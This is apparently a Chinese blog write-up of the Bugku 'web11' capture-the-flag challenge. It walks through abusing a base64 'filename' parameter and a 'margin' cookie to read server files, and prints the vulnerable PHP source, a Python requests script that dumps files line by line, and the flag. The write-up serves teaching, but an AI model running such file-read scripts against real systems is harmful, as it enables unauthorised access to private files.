---
title: bugku_web11
date: 2019-07-16
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---
# bugku_web11
## 题目地址：

http://123.206.87.240:8002/web11/index.php?line=&filename=a2V5cy50eHQ=

备注：我用的是python3

<!-- more -->

## filename=a2V5cy50eHQ=

文件包含

因为filename一般说明源代码中有读取打开文件的函数

从下面源码中可知的确含有函数file()

## base64格式

大小写字母+=/

# line=

可能与读取行数有关

# php函数

isset()判断是非设置值

header url重定向

in_array 第一个是匹配字符，第二个是数组

file 读取文件每一行

## 尝试文件读取的步骤

cookies 里面要有值

margin=margin

filename =keys.php

keys.php要base64加密a2V5cy5waHA=

获取的index.php的源码

```
<?php

error_reporting(0);

$file = base64_decode(isset($_GET['filename'])?$_GET['filename']:"");

$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");

$file_list = array(

'0' =>'keys.txt',

'1' =>'index.php',
'2'=> 'keys.php'

);

 

if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){

$file_list[2]='keys.php';

}

 

if(in_array($file, $file_list)){

$fa = file($file);

echo $fa[$line];

}

?>
import requests
for a in range(0,100):
    index_url = 'http://123.206.87.240:8002/web11/index.php?line='+str(a)+'&filename=aW5kZXgucGhw'
    session = requests.session()
    index = session.get(index_url)
    if index.text!="":
        print(index.text)
    else:
        break;

for a in range(0,100):
    flag_url = 'http://123.206.87.240:8002/web11/index.php?line='+str(a)+'&filename=a2V5cy5waHA='
    cook = {
        'margin':'margin'
    }
    flag = session.get(flag_url,cookies=cook)
    if flag.text!="":
        print(flag.text)
    else:
        break
```

# key=’KEY{key_keys}

# 解题步骤总结

## 1.乱码试着解码

## 2.url中的filename尝试文件包含

## 3.编写脚本

## 4.代码审计

## 5.cookie满足要求

## 6.继续脚本发送获取key

# 题目所需基础知识

#### php基础语法,函数看不懂可以查,不急

#### python基础语法,函数看不懂可以查,不急

#### requests库基本操作

#### 了解一下说明是cookies和session

#### http的response和request，head

# 工具

解码网站：某个大佬的博客

https://www.wishingstarmoye.com/